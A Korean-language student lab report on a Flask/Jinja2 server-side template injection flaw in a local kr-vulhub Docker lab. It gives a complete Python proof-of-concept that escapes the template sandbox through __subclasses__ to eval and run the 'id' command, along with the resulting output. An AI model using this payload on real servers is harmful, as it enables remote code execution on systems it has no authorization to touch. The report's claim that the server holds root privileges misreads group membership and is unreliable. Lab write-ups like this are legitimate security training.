# Flask (Jinja2) SSTI 취약점 검증 및 PoC 실습 보고서
> 화이트햇 스쿨 3기 - 최아현(5975)

<br/>

## 1. SSTI 개념 증명 해보기 (poc코드 수정 전)

과제에서 제공받은 깃허브 링크에서 **Flask (Jinja2) SSTI (Server Side Template Injection) 취약점**을 선택하였고, 이 취약점을 실습해보기 위하여 해당 깃허브 링크를 fork하여 내 github에 복사하였다.

### 1.1 실습 환경 구축

- docker desktop 설치
- Git-2.49.0-64-bit 설치
- python 3.13.3 도 설치
  
### 1.2 프로젝트 clone 및 실행

다음 명령어를 통하여 내 GitHub에서 Fork된 kr-vulhub 클론한 뒤 해당 폴더로 이동하였다.
<br/>
1. git clone https://github.com/ChoiAh/kr-vulhub.git
2. cd kr-vulhub/Flask/SSTI

### 1.3 Docker로 Flask 서버 실행하기
<docker-compose up -d>명령어를 통하여 Flask 서버를 실행하였다.
![docker-compose up -d 실행결과](./1.png)
<br/>
### 1.4 브라우저에서 flask 서버 접속
브라우저에서 서버를 접속하여 결과를 확인해보았다.
![서버 접속 실행결과](./2.png)
1. http://localhost:8000/?name={{7*7}} → Hello 49 출력 확인
2. http://localhost:8000/?name={{5*5}} → Hello 25 출력 확인

### 1.5 출력 결과 분석
이건 서버가 내가 입력한 값(ex. {7*7} / {5*5})을 받아서 내부에서 Flask 서버가 이걸 Jinja2 템플릿 문법으로 처리해서 입력된 수식을 실제로 계산한 결과를 출력하여 보여주는 것을 확인하였다. 이는 서버가 사용자의 입력을 문자열로 인식하여 처리하는 것이 아닌 python연산처럼 처리하고 실행한 것을 의미한다. 
<br/>
이는 서버의 템플릿 엔진이 외부의 사용자 입력을 검증하지 않고 실행하여 발생한 것으로 위의 Flask 서버에는 SSTI 취약점이 존재한다. 이러한 단순 수식 계산에서 더 나아가 시스템 명령어를 실행할 수 있는지를 확인해보기 위하여 이어지는 부분에서 공격 코드를 작성하여 실습을 진행해보고자 한다.

## 2. 공격코드 (poc.py) 실행
Flask 서버에 실제 시스템 명령어 삽입하기 (PoC 수행)
<br/>
### 2.1 poc.py 작성
vs code에서 C:\Users\chloe\kr-vulhub\Flask\SSTI 이 경로에 poc.py라는 이름의 py파일을 생성하고 아래의 코드를 입력해 넣었다.
```python
from urllib import parse
import requests

script = '__import__("os").popen("id").read()'
# SSTI 취약점 유발 코드
value = """{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('%s') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}"""
value = value.replace("%s", script)

print("<SSTI 취약점 유발 코드>")
print(value)
print()

# SSTI를 수행하는 URL 생성
query = [("name", value)]
url = "http://localhost:8000/?" + parse.urlencode(query)
print("<요청 URL>")
print(url)
print()

# 실제 요청 전송
response = requests.get(url)
print("<서버의 응답>")
print(response.text)
```
<br/>
![vs code로 poc.py작성](./3.png)
<br/>
### 2.2 poc.py 실행
py poc.py명령을 통하여 위에서 작성한 코드를 실행해보았다.
![poc.py 실행결과](./4.png)
위의 사진처럼 출력이 되었다.
 > uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)
<br/>
### 2.3 출력값의 의미
- uid=33(www-data)  → 현재 FLASK서버가  uid=33(www-data) 계정으로 실행중이라는 의미
- gid=33(www-data) →   현재 FLASK서버가  gid=33(www-data) 그룹 계정으로 실행중이라는 의미
- groups=33(www-data),0(root) → 이서버는 root권한도 가지고 있다는 뜻
<br/>
### 2.4 출력 결과 분석
즉, 템플릿 인젝션으로 서버에서 임의 시스템 명령어 실행이 가능했고 실행된 결과로 서버 내부 계정 정보를 탈취할 수 있었다. 따라서 결과적으로 해당 flask 서버의 제어권한을 획득할 수 있었다. 
서버에서  os명령어가 실행되었고 해당 flask 서버가 root권한을 포함하고 있는 것을  확인할 수 있음
<br/>
## 3. 결론
poc.py 스크립트를 통하여 SSTI(Server Side Template Injection) 취약점이 존재하는 FLASK서버에 악의적인 템플릿 코드<`__import__("os").popen("id").read()` 명령어를 실행하는 코드>를 삽입하였다.
따라서 서버는 해당 코드를 실행하여 현재 사용자의 UID, GID, groups 정보를 알려주었다. 
이 실습을 통하여 flask 서버의 SSTI 취약점을 통하여 원격 코드 실행(RCE, Remote Code Execution)수준의 제어가 가능함을 확인할 수 있었으며 공격자는 name 파라미터에 Jinja2 템플릿 문법을 삽입함으로써 서버 측에서 Python 코드가 실행되도록 유도할 수 있었다. 즉, 단순 수식 평가뿐 아니라 시스템 명령어인 id같은 명령어까지 실행할 수 있어 서버의 중요 정보인 UID, GID 정보가 노출되는 SSTI 취약점을 확인해 보았다.
이러한 취약점의 경우**원격 명령 실행(RCE)** 으로 이어질 수 있기에 심각한 보안 위협이며, 이에대한 조치가 필요함을 느꼈다.
